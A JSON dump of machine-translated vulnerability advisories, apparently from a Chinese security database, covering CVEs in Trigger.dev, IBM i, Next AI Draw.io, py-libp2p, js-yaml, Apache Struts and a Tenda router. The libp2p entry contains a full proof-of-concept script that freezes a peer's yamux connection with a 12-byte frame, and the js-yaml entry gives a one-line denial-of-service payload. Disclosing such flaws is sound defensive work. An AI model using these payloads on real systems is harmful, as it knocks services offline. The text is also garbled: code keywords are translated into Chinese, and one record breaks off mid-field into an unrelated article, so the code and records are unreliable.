 "title": "如何预防路径遍历"}], "cnvd_id": "", "cve_id": "CVE-2026-73659", "cvss": {"cvssv31": [{"source": "security-advisories@github.com", "vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N", "severity": "high", "base_score": 8.1}]}, "cvss_score": 8.1, "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N", "cwe": "CWE-22", "description": "Trigger.dev 是用于在 TypeScript 中构建 AI 工作流程的开源平台。从4.4.2到4.5.0，apps/webapp/app/routes/api.v1.packets.$.ts中的数据包预签名路由通过resolveStoreProtocolForPacketPresign传递调用者控制的文件名到apps/webapp/app/v3/objectStore.server.ts中的generatePresignedUrl和generatePresignedRequest，允许..遍历转义packets/\u003cprojectRef\u003e/\u003cenv\u003e/ object-store前缀并启用项目 API 密钥来读取或覆盖另一个组织的卸载任务负载和多组织自托管实例上的输出。此问题已在 4.5.0 版本中修复。", "effects": [], "epss": -1, "exp": false, "exploit_requirement": "", "exploit_requirement_cost": "低", "exploitability": "中", "fix_suggestion": "建议修复", "kind": "路径遍历", "kind_en": "对受限制目录的路径名的不正确限制（“路径遍历”）", "last_modified_time": "2026-08-14", "level": "High", "mps_id": "MPS-s5oi-wxl9", "poc": false, "poc_url": [], "published_time": "2026-08-14", "reference_url_list": [{"url": "https://www.oscs1024.com/hd/MPS-s5oi-wxl9", "name": "https://www.oscs1024.com/hd/MPS-s5oi-wxl9"}, {"url": "https://nvd.nist.gov/vuln/detail/CVE-2026-73659", "name": "https://nvd.nist.gov/vuln/detail/CVE-2026-73659"}, {"url": "https://github.com/triggerdotdev/trigger.dev/commit/db4074df54db06b0656becf3f974345c90fa202e", "name": ""}, {"url": "https://github.com/triggerdotdev/trigger.dev/pull/3830", "name": ""}, {"url": "https://github.com/triggerdotdev/trigger.dev/releases/tag/v4.5.0", "name": ""}, {"url": "https://github.com/triggerdotdev/trigger.dev/security/advisories/GHSA-m3mf-37q7-8928", "name": ""}], "scope_influence": "", "tags": [], "title": "CVE-2026-73659漏洞", "_translated": true, "_saved_at": "2026-08-13T23:35:23+00:00", "_first_saved_at": "2026-08-13T23:35:23+00:00", "_source_page": "https://www.oscs1024.com/hd/MPS-s5oi-wxl9"}, {"analysis_status": 0, "articles": [{"content": "应用程序在权限管理方面存在缺陷，未能正确地验证和限制用户的权限。这可能包括访问控制列表（ACL）的不当配置、权限检查的缺失或错误、不恰当的身份验证和授权过程等。攻击者可以利用这些缺陷来绕过访问控制，获得未经授权的权限，执行敏感操作或访问敏感信息。", "title": "什么是权限管理不当"}, {"content": "- 水平权限提升：攻击者以与当前授权相同的权限冒充其他用户，获取对其他用户的访问权限。这可能是由于应用程序未能适当验证和限制用户的身份验证和授权。\r\n- 垂直权限提升：攻击者以比其当前授权更高的权限执行操作，获取对更高权限资源的访问。这可以发生在应用程序未正确验证用户请求的权限级别，或者在权限检查过程中存在漏洞的情况下。\r\n- 特权维持：攻击者通过利用特权管理的不当实施，将其特权保持在系统中。这可以包括未及时撤销特权、未正确管理特权的生命周期等。", "title": "权限管理不当常见的攻击方式"}, {"content": "- 适当的访问控制：应用程序应该实施适当的访问控制机制，包括强制访问控制列表（ACL）、角色基础访问控制（RBAC）、最小权限原则等，以确保用户只能访问其授权范围内的资源。\r\n- 身份验证和授权的正确实施：应用程序应该正确实施身份验证和授权机制，包括验证用户的身份、验证请求的权限级别，以及在授权过程中进行必要的权限检查。\r\n- 权限分离原则：应用程序应该根据职责和功能将特权分离，并只授予用户所需的最低权限，遵循最小特权原则。\r\n- 审计和监控：应用程序应该记录和监控特权操作，及时检测和响应异常或未经授权的特权访问。\r\n- 安全编码实践：开发人员应遵循安全编码实践，如输入验证、输出编码、错误处理等，以防止特权管理不当的漏洞。", "title": "如何预防权限管理不当"}], "cnvd_id": "", "cve_id": "CVE-2026-18071", "cvss": {"cvssv31": [{"source": "psirt@us.ibm.com", "vector": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H", "severity": "high", "base_score": 7.8}]}, "cvss_score": 7.8, "cvss_vector": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H", "cwe": "CWE-269", "description": "IBM i 7.6、7.5、7.4 和 7.3 可能允许本地攻击者因权限管理不当而获得提升的权限。", "effects": [], "epss": -1, "exp": false, "exploit_requirement": "", "exploit_requirement_cost": "低", "exploitability": "中", "fix_suggestion": "建议修复", "kind": "权限管理不当", "kind_en": "权限管理不当", "last_modified_time": "2026-08-14", "level": "High", "mps_id": "MPS-4zlo-kw9q", "poc": false, "poc_url": [], "published_time": "2026-08-14", "reference_url_list": [{"url": "https://www.oscs1024.com/hd/MPS-4zlo-kw9q", "name": "https://www.oscs1024.com/hd/MPS-4zlo-kw9q"}, {"url": "https://nvd.nist.gov/vuln/detail/CVE-2026-18071", "name": "https://nvd.nist.gov/vuln/detail/CVE-2026-18071"}, {"url": "https://www.ibm.com/support/pages/node/7283579", "name": ""}], "scope_influence": "", "tags": [], "title": "CVE-2026-18071漏洞", "_translated": true, "_saved_at": "2026-08-13T20:36:06+00:00", "_first_saved_at": "2026-08-13T20:36:06+00:00", "_source_page": "https://www.oscs1024.com/hd/MPS-4zlo-kw9q"}, {"analysis_status": 0, "articles": [], "cnvd_id": "", "cve_id": "CVE-2026-72777", "cvss": {"cvssv31": [{"source": "disclosure@vulncheck.com", "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N", "severity": "high", "base_score": 8.6}], "cvssv4": [{"source": "disclosure@vulncheck.com", "vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:N/SC:H/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X", "severity": "high", "base_score": 7.7}]}, "cvss_score": 7.7, "cvss_vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:N/SC:H/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X", "cwe": "CWE-918", "description": "Next AI Draw.io 到 0.4.16 在 POST /api/parse-url 端点中包含服务器端请求伪造漏洞，因为主机名验证仅检查字符串模式而不进行 DNS 解析。未经身份验证的攻击者可以提供绕过字符串验证但解析为内部地址的主机名，从而允许他们访问任意内部 HTTP 服务并窃取包括云元数据在内的响应。", "effects": [], "epss": -1, "exp": false, "exploit_requirement": "", "exploit_requirement_cost": "低", "exploitability": "中", "fix_suggestion": "建议修复", "kind": "SSRF", "kind_en": "服务器端请求伪造 (SSRF)", "last_modified_time": "2026-08-14", "level": "High", "mps_id": "MPS-k0j2-b76m", "poc": false, "poc_url": [], "published_time": "2026-08-14", "reference_url_list": [{"url": "https://www.oscs1024.com/hd/MPS-k0j2-b76m", "name": "https://www.oscs1024.com/hd/MPS-k0j2-b76m"}, {"url": "https://nvd.nist.gov/vuln/detail/CVE-2026-72777", "name": "https://nvd.nist.gov/vuln/detail/CVE-2026-72777"}, {"url": "https://github.com/DayuanJiang/next-ai-draw-io/issues/918", "name": ""}, {"url": "https://www.vulncheck.com/advisories/next-ai-draw-io-ssrf-via-dns-rebinding-in-parse-url", "name": ""}], "scope_influence": "", "tags": [], "title": "CVE-2026-72777漏洞", "_translated": true, "_saved_at": "2026-08-13T20:36:04+00:00", "_first_saved_at": "2026-08-13T20:36:04+00:00", "_source_page": "https://www.oscs1024.com/hd/MPS-k0j2-b76m"}, {"analysis_status": 0, "articles": [{"content": "应用程序未能有效地控制资源的使用，导致攻击者可以利用这个漏洞耗尽应用程序所依赖的资源。这些资源可以是计算资源（CPU、内存）、网络带宽、数据库连接或其他系统资源。攻击者可以通过发送特制的请求、恶意输入或其他方式，使应用程序消耗大量资源，导致拒绝服务或系统崩溃。", "title": "什么是拒绝服务"}, {"content": "- 消耗计算资源：攻击者可以发送计算密集型的请求，例如复杂的计算、无限循环或递归操作，以耗尽应用程序的计算资源，导致应用程序无法响应其他请求。\r\n- 消耗内存资源：攻击者可以发送大量的数据或恶意输入，以导致应用程序消耗过多的内存资源，从而使系统的可用内存耗尽，并导致应用程序崩溃或变得不可用。\r\n- 消耗网络带宽：攻击者可以发送大量的请求或大型数据包，以消耗应用程序所依赖的网络带宽。这会导致其他合法用户无法正常访问应用程序或降低系统的整体网络性能。\r\n- 消耗存储资源：攻击者可以发送大量的请求或上传大文件，以耗尽应用程序的存储资源，导致系统无法处理其他请求或存储新的数据。", "title": "拒绝服务常见的攻击方式"}, {"content": "- 输入验证与过滤：应用程序应该对输入数据进行合理的验证和过滤，防止恶意输入导致资源消耗过高。\r\n- 实施资源限制：应用程序应该实施适当的资源限制策略，例如限制计算操作的时间或次数，限制内存使用量，限制并发连接数等，以防止资源被耗尽。\r\n- 异常处理与错误恢复：应用程序应该具备健壮的异常处理和错误恢复机制，以防止因意外错误导致资源泄漏或无法释放的情况。\r\n- 资源监控与警报：应用程序应该实施适当的资源监控和警报机制，及时发现异常的资源消耗情况，并采取相应的措施来应对。\r\n- 压力测试与性能优化：应用程序应该进行压力测试，以评估其在高负载情况下的性能，并进行必要的性能优化，以确保能够有效地处理大量请求而不耗尽资源。", "title": "如何预防拒绝服务"}], "cnvd_id": "", "cve_id": "CVE-2026-73568", "cvss": {"cvssv31": [{"source": "security-advisories@github.com", "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H", "severity": "high", "base_score": 7.5}]}, "cvss_score": 7.5, "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H", "cwe": "CWE-400", "description": "### 总结\npy-libp2p 中的 yamux 流多路复用器在读取帧主体之前不会根据接收窗口验证传入的 DATA 帧长度。任何完成标准 libp2p 握手的对等方都可以发送一个 12 字节帧，声明 4 GB 主体，导致受害者的 yamux 读取循环无限期阻塞。这会影响默认的“new_host()”配置，并且不需要双方进行特殊设置。\n\n### 详细信息\n在“libp2p/stream_muxer/yamux/yamux.py”（第 915 行到 926 行）中，“handle_incoming()”方法按帧类型进行调度。当数据帧到达时，它无条件读取主体：\n\n````蟒蛇\nelif 类型 == TYPE_DATA：\n    尝试：\n        数据 = (\n            等待 read_exactly(self.secured_conn, 长度)\n            如果长度 \u003e 0\n            否则b””\n        ）\n````\n\n“length”字段直接取自有线解码帧头，是一个 32 位无符号整数，最大值为 4,294,967,295。不检查“length”是否适合流的接收窗口（“DEFAULT_WINDOW_SIZE = 256 * 1024”字节）。正文读取也会发生在代码检查引用的“stream_id”是否存在于“self.streams”中之前（该检查位于第 954 行），因此任何流 ID 都会触发该问题。\n\n`handle_incoming()` 本身是一个单一的顺序循环，在主体读取周围没有超时。一旦“read_exactly”暂停等待永远不会到来的数据，循环就无法处理任何后续帧。该 yamux 连接上的每个流都会停止工作，并且不会引发异常。\n\n相同的不受保护的调用出现在第 804 至 806 行的 SYN 分支中，因此具有大长度字段的精心设计的 SYN 帧会触发相同的停顿。\n\nyamux 规范（第 3.3 节）明确要求如果发送方传输的数据多于接收窗口允许的数据，则接收方重置流。 py-libp2p 不会在接收端强制执行此操作。所有三个类似的实现都是这样做的： go-yamux 跟踪每个流的“recvWindow”并在违反时返回“SendWindowExceeded”错误； rust-yamux 根据流信用验证帧长度； js-libp2p yamux 根据“maxMessageSize”检查帧长度。\n\n### 概念验证\n该工具完成两个本地主机之间的正常噪声握手和 yamux 协商，通过攻击前 ping 确认 yamux 运行状况良好，然后将单个恶意帧直接写入攻击者的安全连接。短暂暂停后，它会尝试打开一个新的流，截止时间为 3 秒。打开的流永远不会完成。\n\n文件：test_poc.py\n\n````蟒蛇\n”“”\n作者：@tahaafarooq\nPOC：通过超大数据帧进行 yamux 连接 DoS（连接 DoS）\n”“”\n导入操作系统\n导入秘密\n导入气相色谱\n导入结构体\n\n导入 psutil\n进口三重奏\n导入多地址\n\n从 libp2p 导入 new_host\n从 libp2p.crypto.ed25519 导入 create_new_key_pair\n从 libp2p.custom_types 导入 TProtocol\n从 libp2p.peer.peerinfo 导入 PeerInfo\n从 libp2p.stream_muxer.yamux.yamux 导入 Yamux\n\nLOOPBACK = multiaddr.Multiaddr(\"/ip4/127.0.0.1/tcp/0\")\nPING = TProtocol(\"/audit/ping/1.0.0\")\n\nYAMUX_HEADER_FORMAT = \"!BBHII\"\n类型数据 = 0x0\nHUGE_LENGTH = 0xFFFF_FFFF # 最大 uint32 — 4,294,967,295 字节\n\n\ndef craft_malicious_frame(stream_id: int = 1) -\u003e 字节：\n    ”“”\n    12 字节 yamux 数据帧，标志 = 0，长度 = 4 GB。\n    Stream_id 不相关：yamux 在检查之前读取正文\n    流是否存在。\n    ”“”\n    返回struct.pack（YAMUX_HEADER_FORMAT，0，TYPE_DATA，0，stream_id，HUGE_LENGTH）\n\n\ndef _get_yamux(主机，peer_id) -\u003e Yamux |无：\n    swarm = 主机.get_network()\n    conns = swarm.connections.get(peer_id)\n    如果 conns 为 None：\n        返回无\n    conn = conns[0] if isinstance(conns, 列表) else conns\n    mc = conn.muxed_conn\n    如果 isinstance(mc, Yamux) 返回 mc 否则无\n\n\n异步防御攻击()：\n    proc = psutil.Process(os.getpid())\n    rss0 = proc.memory_info().rss\n\n    v_kp = create_new_key_pair(secrets.token_bytes(32))\n    a_kp = create_new_key_pair(secrets.token_bytes(32))\n\n    # 默认 new_host() — 噪声 + yamux — 没有显式的 sec_opt 或 muxer_opt\n    受害者 = new_host(key_pair=v_kp)\n    攻击者 = new_host(key_pair=a_kp)\n\n    victim.set_stream_handler(PING, lambda s: s.close())与victim.run异步（listen_addrs = [LOOPBACK]）：\n        vaddr = 受害者.get_addrs()[0]\n        在 str(vaddr) 中断言“127.0.0.1”，“安全：非环回”\n        print(f\"[*] 受害者：{vaddr}\")\n        print(f\"[*] 配置：默认（噪声 + yamux）\")\n\n        与 Attacker.run 异步（listen_addrs=[LOOPBACK]）：\n            等待攻击者.connect(PeerInfo(victim.get_id(),victim.get_addrs()))\n            等待 trio.sleep(0.2)\n\n            a_yamux = _get_yamux(攻击者, 受害者.get_id())\n            v_yamux = _get_yamux(受害者, 攻击者.get_id())\n            断言 a_yamux 和 v_yamux，“未找到 yamux muxed_conn”\n            打印（\n                f\"[*] Muxer : 攻击者={type(a_yamux).__name__}, \"\n                f“受害者= {类型（v_yamux）.__name__}”\n            ）\n\n            # --- 预攻击：确认 yamux 健康 ---\n            pre_stream = 等待攻击者.new_stream(victim.get_id(), [PING])\n            等待 pre_stream.close()\n            print(\"[*] 攻击前 ping: OK (yamux live)\")\n\n            # --- 注入恶意框架 ---\n            框架 = craft_malicious_frame(stream_id=1)\n            打印（\n                f\"[*] 注入 {len(frame)} 字节 yamux 帧：\"\n                f“类型=数据标志=0x0stream_id=1长度={HUGE_LENGTH：#010x}”\n                f\"({HUGE_LENGTH:,} 字节)\"\n            ）\n            print(f\"[*] 十六进制帧: {frame.hex()}\")\n\n            # 直接写入噪声加密的安全连接。\n            # secure_conn.write() 在发送前加密；受害者解密并\n            # 查看handle_incoming 处理的原始 yamux 帧字节。\n            等待 a_yamux.secured_conn.write(frame)\n            等待 trio.sleep(0.2)\n            # 受害者的handle_incoming现在已经读取了12字节的标头，并已发送\n            # 到 `eliftyp == TYPE_DATA:`，并输入 read_exactly(conn, 4GB)。\n\n            # --- 攻击后：尝试使用 yamux ---\n            post_attack_succeeded = False\n\n            与 trio.move_on_after(3.0) 一起：\n                尝试：\n                    post_stream = 等待攻击者.new_stream(victim.get_id(), [PING])\n                    等待 post_stream.close()\n                    post_attack_succeeded = True\n                除了异常 e：\n                    print(f\"[*] 攻击后 new_stream 错误: {type(e).__name__}: {e}\")\n\n            GC.collect()\n            rss1 = proc.memory_info().rss\n\n            打印（“\\n===结果===”）\n            print(f\"注入的帧（十六进制）：{frame.hex()}\")\n            打印（\n                f“正文长度字段：请求 {HUGE_LENGTH} 字节，发送 0 字节”\n            ）\n            print(f\"攻击后 ping 正常：{post_attack_succeeded}\")\n            print(f\"RSS 增量：{(rss1 - rss0) / 1024:.1f} KiB\")\n\n            yamux_stuck = 未 post_attack_succeeded\n            print(f\"\\n受害者 yamux 循环卡住：{yamux_stuck}\")\n\n            如果 yamux_stuck：\n                打印（\n                    “[已确认] handle_incoming 被阻止 - 受害者 yamux 因“而死亡”\n                    “这个联系。”\n                ）\n                打印（\n                    “[影响]来自任何经过身份验证的对等方的单个 12 字节写入”\n                    “（噪声握手后）\\n”\n                    \" 永久停止该连接的 yamux。\\n\"\n                    “影响默认 new_host() 配置 - 不需要 mplex。\\n”\n                    “没有超时，没有最大长度检查，没有例外。”\n                ）\n            其他：\n                print(\"[未确认] yamux 在攻击后做出了响应。\")\n\n            断言 yamux_stuck, (\n                “预计 yamux 在注入恶意 DATA 帧后会被卡住，”\n                “但连接仍然有效。”\n            ）\n\n\ndef test_yamux_data_frame_stall():\n    三人组奔跑（攻击）\n\n\n如果 __name__ == \"__main__\":\n    三人组奔跑（攻击）\n````\n\n````\npython3 -m pytest test_poc.py::test_yamux_data_frame_stall -v\n````\n\n恶意帧（12字节，十六进制）：`00000000000000 01ffffffff`\n\n````\n版本=0x00\n类型 = 0x00（数据）\n标志= 0x0000\n流_id = 0x00000001\n长度 = 0xFFFFFFFF（4,294,967,295 字节）\n````\n\n输出：\n\n````\n[*] 配置：默认（噪音 + yamux）[*] 攻击前 ping：好的（yamux live）\n[*] 注入 12 字节 yamux 帧： type=DATA flags=0x0 stream_id=1 length=0xffffffff\n受害者 yamux 循环卡住：True\n[已确认] handle_incoming 被阻止 - 受害者 yamux 因该连接而死亡。\n约 3.8 秒内通过\n````\n\n### 影响\n单个经过身份验证的对等点（已完成噪声握手，无需凭据）可以使用 12 字节的有效负载永久冻结给定连接的 yamux 读取循环。该连接上的所有流都停止工作。不会引发异常，不会写入日志条目，也不会发生自动恢复。\n\n这适用于默认的“new_host()”配置。与 mplex 复用器中的类似问题（需要显式选择加入）不同，使用标准设置的每个 py-libp2p 节点都会受到影响。在 10,000 个连接的默认连接限制下，运行 10,000 个对等点的攻击者可以使用大约 120 KB 的总流量冻结所有连接。\n\n不存在机密性或完整性影响。影响仅限于目标 yamux 连接上的可用性。\n\n### 补救措施\n\n**1.对入站数据帧强制执行接收窗口**（主要修复）\n在调用“read_exactly”之前，拒绝声明长度超过协商接收窗口的帧：\n\n````蟒蛇      \n# libp2p/stream_muxer/yamux/yamux.py\n                                                                                                           \nMAX_YAMUX_FRAME = 256 * 1024 # 匹配 DEFAULT_WINDOW_SIZE 和 go-yamux 默认值\n                                                     \nelif 类型 == TYPE_DATA：\n    如果长度\u003e MAX_YAMUX_FRAME：\n        记录器.警告(\n            f\"yamux: 过大的 DATA 帧长度={length} \u003e {MAX_YAMUX_FRAME}，发送 RST\"\n        ）\n        rst_header = struct.pack（YAMUX_HEADER_FORMAT，0，TYPE_DATA，FLAG_RST，stream_id，0）\n        等待 self.secured_conn.write(rst_header)\n        continue # 跳过正文读取；循环处理下一帧\n    数据 = 等待 read_exactly(self.secured_conn, length) 如果长度 \u003e 0 否则 b\"\"\n````\n\n相同的检查应该应用于第 804 至 806 行的 SYN 分支。\n\n**2.在`handle_incoming()`**中添加每帧超时\n\n````蟒蛇\n而不是 self.event_shutting_down.is_set()：\n    尝试：\n        与 trio.fail_after(60) 一起：\n            标头 = 等待 read_exactly(self.secured_conn, HEADER_SIZE)\n            ...\n    除了 trio.TooSlowError：\n        logger.warning(\"yamux: 帧读取超时，正在关闭连接\")\n        self.event_shutting_down.set()\n        打破\n````\n\n选项 1 完全消除了放大。选项 2 限制了未来可能引入的任何超大读取路径的最坏情况停顿持续时间。", "effects": [{"comp_name": "libp2p", "ecosystem": "pip", "versions": [{"affected_version": "(-∞,0.7.0]", "min_fixed_version": "", "repository": "pip", "solutions": [], "upstream": true}]}], "epss": -1, "exp": false, "exploit_requirement": "", "exploit_requirement_cost": "低", "exploitability": "中", "fix_suggestion": "建议修复", "kind": "拒绝服务", "kind_en": "不受控制的资源消耗", "last_modified_time": "2026-08-14", "level": "High", "mps_id": "MPS-bqvp-9x05", "poc": false, "poc_url": [], "published_time": "2026-08-14", "reference_url_list": [{"url": "https://github.com/libp2p/py-libp2p/security/advisories/GHSA-hmj8-5xmh-5573", "name": ""}, {"url": "https://github.com/libp2p/py-libp2p/commit/146ea87d1a20cc7dacf684ecf7c204543be04b37", "name": ""}, {"url": "https://github.com/advisories/GHSA-hmj8-5xmh-5573", "name": ""}], "scope_influence": "", "tags": ["python", "开源"], "title": "libp2p：通过超大数据帧进行 yamux 连接 DoS", "_translated": true, "_saved_at": "2026-08-13T19:53:52+00:00", "_first_saved_at": "2026-08-13T19:53:52+00:00", "_source_page": "https://www.oscs1024.com/hd/MPS-bqvp-9x05"}, {"analysis_status": 0, "articles": [], "cnvd_id": "", "cve_id": "CVE-2026-73643", "cvss": {"cvssv31": [{"source": "security-advisories@github.com", "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H", "severity": "high", "base_score": 7.5}]}, "cvss_score": 7.5, "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H", "cwe": "CWE-407", "description": "### 总结\n解析小型 YAML 文档可能需要指数级的时间。对不受信任的输入调用“load()”或“loadAll()”的应用程序可能会被小于 200 字节的负载挂起。\n\n### 详细信息\n当流序列中的条目结果是“键：值”对时，解析器会倒带并再次解析该条目作为键。\n如果键本身是相同形状的嵌套流序列，则每个级别都会解析两次，因此嵌套深度上的总工作量为 O(2^n)。默认的 maxDepth 100 没有帮助，因为在大约 30 到 40 个级别时时间已经难以管理。\n\n根本原因，可能是：[parser.ts](https://github.com/nodeca/js-yaml/blob/master/src/parser/parser.ts)中的`readFlowCollection`，`restoreState`后面跟着第二个`parseNode`。\n\n\n### 概念验证\n\n```javascript\nconst yaml = require('js-yaml')\n常量 n = 30\nyaml.load('[ '.repeat(n) + '1' + ' ]: 0'.repeat(n))\n````\n\n使用默认选项：22 个级别大约需要 1 秒，26 个级别大约需要 17 秒，30 个级别需要 2 分钟。输入保持在 200 字节以下，并随“n”线性增长。\n\n### 影响\n拒绝服务。单个小请求可能会使一个 CPU 忙碌几分钟或更长时间，并阻塞 Node 事件循环，因此一个请求可能会拖延整个进程。不需要锚点、别名、合并、标签或非默认选项，并且它会在默认模式上重现。", "effects": [{"comp_name": "js-yaml", "ecosystem": "npm", "versions": [{"affected_version": "[5.0.0,5.2.2)", "min_fixed_version": "5.2.2", "repository": "npm", "solutions": [], "upstream": true}]}], "epss": -1, "exp": false, "exploit_requirement": "", "exploit_requirement_cost": "低", "exploitability": "中", "fix_suggestion": "建议修复", "kind": "低效算法复杂性", "kind_en": "低效的算法复杂性", "last_modified_time": "2026-08-14", "level": "High", "mps_id": "MPS-d2ry-o48w", "poc": false, "poc_url": [], "published_time": "2026-08-14", "reference_url_list": [{"url": "https://github.com/nodeca/js-yaml/security/advisories/GHSA-pm4m-ph32-ghv5", "name": ""}, {"url": "https://github.com/nodeca/js-yaml/commit/3e5240f9cbe645ce5afb58524954a13c8539c853", "name": ""}, {"url": "https://github.com/nodeca/js-yaml/releases/tag/5.2.2", "name": ""}, {"url": "https://github.com/advisories/GHSA-pm4m-ph32-ghv5", "name": ""}], "scope_influence": "", "tags": ["npm", "开源"], "title": "js-yaml：流集合中的指数解析时间导致拒绝服务", "_translated": true, "_saved_at": "2026-08-13T19:54:03+00:00", "_first_saved_at": "2026-08-13T19:54:03+00:00", "_source_page": "https://www.oscs1024.com/hd/MPS-d2ry-o48w"}, {"analysis_status": 0, "articles": [{"content": "应用程序未能有效地控制资源的使用，导致攻击者可以利用这个漏洞耗尽应用程序所依赖的资源。这些资源可以是计算资源（CPU、内存）、网络带宽、数据库连接或其他系统资源。攻击者可以通过发送特制的请求、恶意输入或其他方式，使应用程序消耗大量资源，导致拒绝服务或系统崩溃。", "title": "什么是拒绝服务"}, {"content": "- 消耗计算资源：攻击者可以发送计算密集型的请求，例如复杂的计算、无限循环或递归操作，以耗尽应用程序的计算资源，导致应用程序无法响应其他请求。\r\n- 消耗内存资源：攻击者可以发送大量的数据或恶意输入，以导致应用程序消耗过多的内存资源，从而使系统的可用内存耗尽，并导致应用程序崩溃或变得不可用。\r\n- 消耗网络带宽：攻击者可以发送大量的请求或大型数据包，以消耗应用程序所依赖的网络带宽。这会导致其他合法用户无法正常访问应用程序或降低系统的整体网络性能。\r\n- 消耗存储资源：攻击者可以发送大量的请求或上传大文件，以耗尽应用程序的存储资源，导致系统无法处理其他请求或存储新的数据。", "title": "拒绝服务常见的攻击方式"}, {"content": "- 输入验证与过滤：应用程序应该对输入数据进行合理的验证和过滤，防止恶意输入导致资源消耗过高。\r\n- 实施资源限制：应用程序应该实施适当的资源限制策略，例如限制计算操作的时间或次数，限制内存使用量，限制并发连接数等，以防止资源被耗尽。\r\n- 异常处理与错误恢复：应用程序应该具备健壮的异常处理和错误恢复机制，以防止因意外错误导致资源泄漏或无法释放的情况。\r\n- 资源监控与警报：应用程序应该实施适当的资源监控和警报机制，及时发现异常的资源消耗情况，并采取相应的措施来应对。\r\n- 压力测试与性能优化：应用程序应该进行压力测试，以评估其在高负载情况下的性能，并进行必要的性能优化，以确保能够有效地处理大量请求而不耗尽资源。", "title": "如何预防拒绝服务"}], "cnvd_id": "", "cve_id": "CVE-2026-73633", "cvss": {"cvssv31": [{"source": "134c704f-9b21-4f2e-91b3-4a467353bcc0", "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H", "severity": "high", "base_score": 7.5}]}, "cvss_score": 7.5, "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H", "cwe": "CWE-400", "description": "Apache Struts 的 JSON 插件中存在不受控制的资源消耗漏洞。当应用程序配置为从 JSON 请求主体填充操作时，插件会将该主体读取到内存中，而不限制其接受的数量，因此单个请求可能会耗尽堆并拒绝向其他用户提供服务。插件的可配置 JSON 输入长度限制不会限制此读取。 JSON插件是一个可选组件；不使用它或在未启用 JSON 请求正文处理的情况下使用它的应用程序不会受到影响。\n\n此问题影响 Apache Struts：从 2.1.8 到 2.3.37、从 2.5.0 到 2.5.33、从 6.0.0 到 6.10.0、从 7.0.0 到 7.2.1。\n\n建议用户升级到6.11.0或7.3.0版本，该版本已修复该问题。", "effects": [], "epss": -1, "exp": false, "exploit_requirement": "", "exploit_requirement_cost": "", "exploitabilit 作。例如，攻击者可以通过向操作系统工具的输入框中输入过多的命令，从而覆盖程序中的重要数据，例如系统文件、配置文件等。 |", "title": "经典缓冲区溢出常见的攻击方式"}, {"content": "- 输入验证：在程序输入处对输入数据进行严格的验证和过滤，确保输入数据符合预期的格式和类型，避免被攻击者注入恶意命令或数据。可以使用正则表达式、格式字符串等方式进行输入验证。\n- 输出过滤：在程序输出处对输出数据进行严格的过滤和检查，确保输出数据符合预期的格式和类型，避免被攻击者截获和篡改。可以使用安全的输出过滤库等方式进行输出过滤。\n- 使用安全的编程模型：使用安全的编程模型，例如避免使用原生的缓冲区管理函数，使用安全的框架和库来处理输入数据和执行命令，避免缓冲区溢出漏洞。\n- 数据库加密和访问控制：对于敏感数据和命令，使用加密和访问控制措施，确保只有授权用户可以访问和执行命令，避免被攻击者窃取和篡改。\n- 定期更新和升级：定期更新和升级应用程序和库的版本，确保应用程序和库的最新版本包含了最新的安全补丁和修复措施，避免安全漏洞的出现和利用。\n- 安全审计和监控：定期对系统和应用程序进行安全审计和监控，及时发现和阻止潜在的安全漏洞和攻击，确保系统和数据的安全和可靠性。", "title": "如何预防经典缓冲区溢出"}], "cnvd_id": "", "cve_id": "CVE-2026-19821", "cvss": {"cvssv2": [{"source": "cna@vuldb.com", "vector": "AV:N/AC:L/Au:S/C:C/I:C/A:C", "severity": "high", "base_score": 9}], "cvssv31": [{"source": "cna@vuldb.com", "vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H", "severity": "high", "base_score": 8.8}], "cvssv4": [{"source": "cna@vuldb.com", "vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:P/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X", "severity": "high", "base_score": 7.4}]}, "cvss_score": 7.4, "cvss_vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:P/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X", "cwe": "CWE-120", "description": "Tenda AC12 15.03.06.23_multi_TD01 中发现了一个漏洞。该漏洞影响组件httpd Web管理界面的文件/goform/SetSysAutoRebbotCfg的formSetRebootTimer函数。对参数 restartTime 的这种操作会导致缓冲区溢出。攻击可能是远程发起的。该漏洞已被公开披露并可能被利用。", "effects": [], "epss": -1, "exp": false, "exploit_requirement": "", "exploit_requirement_cost": "低", "exploitability": "中", "fix_suggestion": "建议修复", "kind": "经典缓冲区溢出", "kind_en": 